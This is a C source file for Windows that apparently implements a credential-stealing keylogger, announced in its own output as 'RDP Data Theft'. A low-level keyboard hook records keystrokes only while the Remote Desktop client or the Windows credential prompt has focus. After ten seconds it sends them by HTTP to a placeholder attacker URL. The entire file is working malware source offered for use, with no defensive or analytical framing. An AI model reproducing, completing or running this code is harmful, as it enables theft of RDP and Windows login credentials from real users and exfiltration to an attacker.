#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

#define BUFFER_SIZE 1024
char keyBuffer[BUFFER_SIZE];
int bufferIndex = 0;

// Get the process ID by process name
DWORD GetProcId(const wchar_t* procName) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (!_wcsicmp(procName, pe32.szExeFile)) {
                    procId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return procId;
}

// Check if the currently focused window belongs to the specified process
BOOL isWindowOfProcessFocused(const wchar_t* processName) {
    DWORD pid = GetProcId(processName);
    if (pid == 0) {
        return FALSE;
    }

    HWND hActiveWindow = GetForegroundWindow();
    if (hActiveWindow == NULL) {
        return FALSE;
    }

    DWORD activePid;
    GetWindowThreadProcessId(hActiveWindow, &activePid);
    return activePid == pid;
}

// Append a character to the buffer safely
void AppendToBuffer(char ch) {
    if (bufferIndex < BUFFER_SIZE - 1) {
        keyBuffer[bufferIndex++] = ch;
        keyBuffer[bufferIndex] = '\0'; // Null-terminate the string
    }
}

// Append a string to the buffer safely
void AppendStringToBuffer(const char* str) {
    while (*str) {
        AppendToBuffer(*str++);
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {
            static int prev;
            BOOL isLetter = TRUE;

            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
                int vkCode = kbdStruct->vkCode;

                if (vkCode == 0xA2) { // LCTRL or initial signal of RALT
                    prev = vkCode;
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }

                if (prev == 0xA2 && vkCode == 0xA5) { // RALT
                    AppendStringToBuffer("<RALT>");
                    isLetter = FALSE;
                }
                else if (prev == 0xA2 && vkCode != 0xA5) {
                    AppendStringToBuffer("<LCTRL>");
                }

                BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

                switch (vkCode) {
                case 0xA3: AppendStringToBuffer("<RCTRL>"); isLetter = FALSE; break;
                case 0xA4: AppendStringToBuffer("<LALT>"); isLetter = FALSE; break;
                case VK_CAPITAL: AppendStringToBuffer("<CAPSLOCK>"); isLetter = FALSE; break;
                case 0x08: AppendStringToBuffer("<ESC>"); isLetter = FALSE; break;
                case 0x0D: AppendToBuffer('\n'); isLetter = FALSE; break;
                case VK_OEM_PLUS: AppendToBuffer(shiftPressed ? '+' : '='); isLetter = FALSE; break;
                case VK_OEM_COMMA: AppendToBuffer(shiftPressed ? '<' : ','); isLetter = FALSE; break;
                case VK_OEM_MINUS: AppendToBuffer(shiftPressed ? '_' : '-'); isLetter = FALSE; break;
                case VK_OEM_PERIOD: AppendToBuffer(shiftPressed ? '>' : '.'); isLetter = FALSE; break;
                case VK_OEM_1: AppendToBuffer(shiftPressed ? ':' : ';'); isLetter = FALSE; break;
                case VK_OEM_2: AppendToBuffer(shiftPressed ? '?' : '/'); isLetter = FALSE; break;
                case VK_OEM_3: AppendToBuffer(shiftPressed ? '~' : '`'); isLetter = FALSE; break;
                case VK_OEM_4: AppendToBuffer(shiftPressed ? '{' : '['); isLetter = FALSE; break;
                case VK_OEM_5: AppendToBuffer(shiftPressed ? '|' : '\\'); isLetter = FALSE; break;
                case VK_OEM_6: AppendToBuffer(shiftPressed ? '}' : ']'); isLetter = FALSE; break;
                case VK_OEM_7: AppendToBuffer(shiftPressed ? '"' : '\''); isLetter = FALSE; break;
                default: break;
                }

                prev = vkCode;
                if (isLetter) {
                    BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                    if (vkCode >= 0x41 && vkCode <= 0x5A) {
                        AppendToBuffer(capsLock ^ shiftPressed ? (char)vkCode : (char)(vkCode + 0x20));
                    }
                    else if (vkCode >= 0x61 && vkCode <= 0x7A) {
                        AppendToBuffer(capsLock ^ shiftPressed ? (char)(vkCode - 0x20) : (char)vkCode);
                    }
                    else if (vkCode >= 0x30 && vkCode <= 0x39) { // 0-9
                        if (shiftPressed) {
                            switch (vkCode) {
                            case '1': AppendToBuffer('!'); break;
                            case '2': AppendToBuffer('@'); break;
                            case '3': AppendToBuffer('#'); break;
                            case '4': AppendToBuffer('$'); break;
                            case '5': AppendToBuffer('%'); break;
                            case '6': AppendToBuffer('^'); break;
                            case '7': AppendToBuffer('&'); break;
                            case '8': AppendToBuffer('*'); break;
                            case '9': AppendToBuffer('('); break;
                            case '0': AppendToBuffer(')'); break;
                            default: break;
                            }
                        }
                        else {
                            AppendToBuffer((char)vkCode);
                        }
                    }
                }
            }
        }
        else {
            // When the active window is not related to the specified processes, don't log.
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to perform HTTP POST request
void SendHttpPost(const char* url, const char* data) {
    HINTERNET hInternet = InternetOpen(L"KeyLogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed\n");
        return;
    }

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("InternetOpenUrlA failed\n");
        InternetCloseHandle(hInternet);
        return;
    }

    DWORD bytesWritten;
    BOOL result = InternetWriteFile(hConnect, data, strlen(data), &bytesWritten);
    if (!result) {
        printf("InternetWriteFile failed\n");
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main(void) {
    printf("\n\n[+] Starting RDP Data Theft\n");
    printf("[+] Waiting for RDP related processes\n\n");

    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, 0, 0);
    if (kbdHook == NULL) {
        printf("Failed to set hook\n");
        return 1;
    }

    DWORD startTime = GetTickCount();
    DWORD currentTime;
    const DWORD TIMEOUT = 10000; // 10 seconds

    while (1) {
        MSG msg;
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        currentTime = GetTickCount();
        if (currentTime - startTime > TIMEOUT) {
            break;
        }
        Sleep(100); // Sleep to prevent high CPU usage
    }

    UnhookWindowsHookEx(kbdHook);

    // Perform HTTP POST request with collected keys
    const char* url = "http://ip/recieve"; // Replace with your URL
    SendHttpPost(url, keyBuffer);

    return 0;
}
